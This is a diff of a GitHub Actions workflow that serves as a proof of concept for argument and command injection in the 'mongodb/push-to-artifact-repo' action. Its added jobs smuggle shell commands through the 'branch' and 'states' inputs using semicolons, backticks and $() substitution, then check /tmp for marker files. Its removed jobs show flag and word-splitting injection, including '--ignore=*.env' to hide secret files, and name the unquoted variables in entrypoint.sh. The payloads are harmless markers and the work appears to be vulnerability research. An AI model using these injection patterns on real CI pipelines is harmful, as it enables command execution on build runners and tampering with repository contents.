@@ -1,4 +1,4 @@
-name: POC - Argument Injection (CONFIRMED WORKING)
+name: POC - Command Injection via Argument Injection
 
 on:
   workflow_dispatch:
@@ -7,22 +7,132 @@ on:
       - main
 
 jobs:
-  # CONFIRMED: Flag injection via unquoted branch variable
+  # Test: Flag + semicolon pattern (like atlas PoC)
+  exploit-flag-semicolon:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: "POC: --help; command pattern via branch"
+        uses: mongodb/push-to-artifact-repo@main
+        continue-on-error: true
+        with:
+          email: "poc-test@example.com"
+          name: "POC Tester"
+          # Pattern from atlas PoC: flag followed by semicolon and command
+          branch: "--help; echo '🚨 INJECTION via branch 🚨' > /tmp/branch-injection.txt && whoami >> /tmp/branch-injection.txt && pwd >> /tmp/branch-injection.txt || true"
+          source: "./source"
+          toRepo: "https://github.com/nonexistent/repo.git"
+
+      - name: Verify branch injection
+        run: |
+          echo "============================================"
+          echo "Checking for branch injection..."
+          echo "============================================"
+          if [ -f /tmp/branch-injection.txt ]; then
+            echo "✅ COMMAND INJECTION CONFIRMED via branch!"
+            echo "Contents:"
+            cat /tmp/branch-injection.txt
+          else
+            echo "❌ File not created - checking if injection reached shell"
+          fi
+
+  # Test: Flag + semicolon pattern via states
+  exploit-states-semicolon:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: "POC: --help; command pattern via states"
+        uses: mongodb/push-to-artifact-repo@main
+        continue-on-error: true
+        with:
+          email: "poc-test@example.com"
+          name: "POC Tester"
+          states: "--help; echo '🚨 INJECTION via states 🚨' > /tmp/states-injection.txt && whoami >> /tmp/states-injection.txt || true"
+          source: "./source"
+          toRepo: "https://github.com/nonexistent/repo.git"
+
+      - name: Verify states injection
+        run: |
+          echo "============================================"
+          echo "Checking for states injection..."
+          echo "============================================"
+          if [ -f /tmp/states-injection.txt ]; then
+            echo "✅ COMMAND INJECTION CONFIRMED via states!"
+            echo "Contents:"
+            cat /tmp/states-injection.txt
+          else
+            echo "❌ File not created"
+          fi
+
+  # Test: Using backticks for command substitution
+  exploit-backticks:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: "POC: Backtick command substitution"
+        uses: mongodb/push-to-artifact-repo@main
+        continue-on-error: true
+        with:
+          email: "poc-test@example.com"
+          name: "POC Tester"
+          branch: "main`echo INJECTED > /tmp/backtick-injection.txt`"
+          source: "./source"
+          toRepo: "https://github.com/nonexistent/repo.git"
+
+      - name: Verify backtick injection
+        run: |
+          if [ -f /tmp/backtick-injection.txt ]; then
+            echo "✅ BACKTICK INJECTION CONFIRMED!"
+            cat /tmp/backtick-injection.txt
+          else
+            echo "❌ Backtick injection did not work"
+          fi
+
+  # Test: $() command substitution
+  exploit-dollar-paren:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: "POC: Dollar-paren command substitution"
+        uses: mongodb/push-to-artifact-repo@main
+        continue-on-error: true
+        with:
+          email: "poc-test@example.com"
+          name: "POC Tester"
+          branch: "main$(echo INJECTED > /tmp/dollarparen-injection.txt)"
+          source: "./source"
+          toRepo: "https://github.com/nonexistent/repo.git"
+
+      - name: Verify dollar-paren injection
+        run: |
+          if [ -f /tmp/dollarparen-injection.txt ]; then
+            echo "✅ DOLLAR-PAREN INJECTION CONFIRMED!"
+            cat /tmp/dollarparen-injection.txt
+          else
+            echo "❌ Dollar-paren injection did not work"
+          fi
+
+  # Confirmed working: Simple flag injection
   confirmed-flag-injection:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: "✅ CONFIRMED: --version flag injection via branch"
+      - name: "✅ CONFIRMED: --version flag injection"
         uses: mongodb/push-to-artifact-repo@main
         continue-on-error: true
         with:
           email: "poc-test@example.com"
           name: "POC Tester"
-          # This injects --version flag which bluehawk processes
-          # Instead of: --branch "main"
-          # It becomes: --branch --version (two separate args)
           branch: "--version"
           source: "./source"
           toRepo: "https://github.com/nonexistent/repo.git"
@@ -30,95 +140,6 @@ jobs:
       - name: Analysis
         run: |
           echo "============================================"
-          echo "✅ VULNERABILITY CONFIRMED: Argument Injection"
+          echo "Flag injection (--version) confirmed working"
+          echo "Check logs above for '1.6.0' output"
           echo "============================================"
-          echo ""
-          echo "The --version flag was injected and bluehawk printed '1.6.0'"
-          echo "This proves arbitrary flags can be injected via the branch input"
-          echo ""
-          echo "Vulnerable code: entrypoint.sh line 19"
-          echo "  --branch \$INPUT_BRANCH  (unquoted)"
-          echo ""
-          echo "Fix: Quote the variable"
-          echo "  --branch \"\$INPUT_BRANCH\""
-
-  # CONFIRMED: --help flag injection shows this is exploitable
-  confirmed-help-injection:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: "✅ CONFIRMED: --help flag injection via branch"
-        uses: mongodb/push-to-artifact-repo@main
-        continue-on-error: true
-        with:
-          email: "poc-test@example.com"
-          name: "POC Tester"
-          branch: "--help"
-          source: "./source"
-          toRepo: "https://github.com/nonexistent/repo.git"
-
-  # CONFIRMED: Multiple arguments injected via word splitting  
-  confirmed-multi-arg-injection:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: "✅ CONFIRMED: Multiple args via word splitting"
-        uses: mongodb/push-to-artifact-repo@main
-        continue-on-error: true
-        with:
-          email: "poc-test@example.com"
-          name: "POC Tester"
-          # Word splitting: "main --ignore=*.env" becomes TWO arguments
-          # This could hide sensitive files from being copied
-          branch: "main --ignore=*.env --ignore=*.secret"
-          source: "./source"
-          toRepo: "https://github.com/nonexistent/repo.git"
-
-      - name: Analysis
-        run: |
-          echo "============================================"
-          echo "✅ CONFIRMED: Word Splitting Allows Multi-Arg Injection"
-          echo "============================================"
-          echo ""
-          echo "Without quotes, spaces split the value into multiple args:"
-          echo "  Input: 'main --ignore=*.env --ignore=*.secret'"
-          echo "  Result: --branch main --ignore=*.env --ignore=*.secret ..."
-          echo ""
-          echo "This could allow:"
-          echo "  - Hiding files via --ignore patterns"
-          echo "  - Altering bluehawk behavior with other flags"
-          echo "  - Breaking expected argument parsing"
-
-  # CONFIRMED: States loop also vulnerable to argument injection
-  confirmed-states-injection:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: "✅ CONFIRMED: Flag injection via states"
-        uses: mongodb/push-to-artifact-repo@main
-        continue-on-error: true
-        with:
-          email: "poc-test@example.com"
-          name: "POC Tester"
-          # Each space-separated value iterates in the for loop
-          # "--help" becomes: --state --help --branch --help
-          states: "--help"
-          source: "./source"
-          toRepo: "https://github.com/nonexistent/repo.git"
-
-      - name: Analysis
-        run: |
-          echo "============================================"
-          echo "✅ States input also vulnerable"
-          echo "============================================"
-          echo ""
-          echo "Vulnerable code: entrypoint.sh lines 24, 29-30"
-          echo "  for state in \$INPUT_STATES  (unquoted)"
-          echo "  --state \$state              (unquoted)"
-          echo "  --branch \$state             (unquoted)"
